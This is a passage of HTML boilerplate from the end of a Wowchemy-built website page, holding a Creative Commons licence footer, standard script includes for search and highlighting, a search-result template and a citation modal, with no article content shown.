href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank aria-label="Creative Commons"><i class="fab fa-creative-commons fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-by fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nc fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nd fa-2x" aria-hidden=true></i></a></p><p class=powered-by>Published with <a href="https://wowchemy.com/?utm_campaign=poweredby" target=_blank rel=noopener>Wowchemy</a> — the free, <a href=https://github.com/wowchemy/wowchemy-hugo-themes target=_blank rel=noopener>open source</a> website builder that empowers creators.</p></footer></div></div><script src=/js/vendor-bundle.min.d26509351aa0ff874abbee824e982e9b.js></script>
<script id=search-hit-fuse-template type=text/x-template>
    <div class="search-hit" id="summary-{{key}}">
      <div class="search-hit-content">
        <div class="search-hit-name">
          <a href="{{relpermalink}}">{{title}}</a>
          <div class="article-metadata search-hit-type">{{type}}</div>
          <p class="search-hit-description">{{snippet}}</p>
        </div>
      </div>
    </div>
  </script><script src=https://cdn.jsdelivr.net/gh/krisk/Fuse@v3.2.1/dist/fuse.min.js integrity="sha512-o38bmzBGX+hD3JHWUFCDA09btWaqrNmoJ3RXLlrysA7PP01Kgs4UlE4MhelE1v5dJR3+cxlR4qQlotsW7jKsnw==" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/gh/julmot/mark.js@8.11.1/dist/jquery.mark.min.js integrity="sha512-mhbv5DqBMgrWL+32MmsDOt/OAvqr/cHimk6B8y/bx/xS88MVkYGPiVv2ixKVrkywF2qHplNRUvFsAHUdxZ3Krg==" crossorigin=anonymous></script>
<script id=page-data type=application/json>{"use_headroom":true}</script><script src=/js/wowchemy-headroom.db4755770454eb63685f8de785c0a172.js type=module></script>
<script src=/en/js/wowchemy.min.e8ee06ba8371980ffde659871dd593b0.js></script><div id=modal class="modal fade" role=dialog><div class=modal-dialog><div class=modal-content><div class=modal-header><h5 class=modal-title>Cite</h5><button type=button class=close data-dismiss=modal aria-label=Close>
<span aria-hidden=true>&#215;</span></button></div><div class=modal-body><pre><code></code></pre></div><div class=modal-footer><a class="btn btn-outline-primary my-1 js-copy-cite" href=# target=_blank><i class="fas fa-copy"></i> Copy</a>
<a class="btn btn-outline-primary my-1 js-download-cite" href=# target=_blank><i class="fas fa-download"></i> Download</a><div id=modal-error></div></div></div></div></div><script src=/js/wowchemy-publication.68f8d7090562ca65fc6d3cb3f8f2d2cb.js type=module></script></body></html>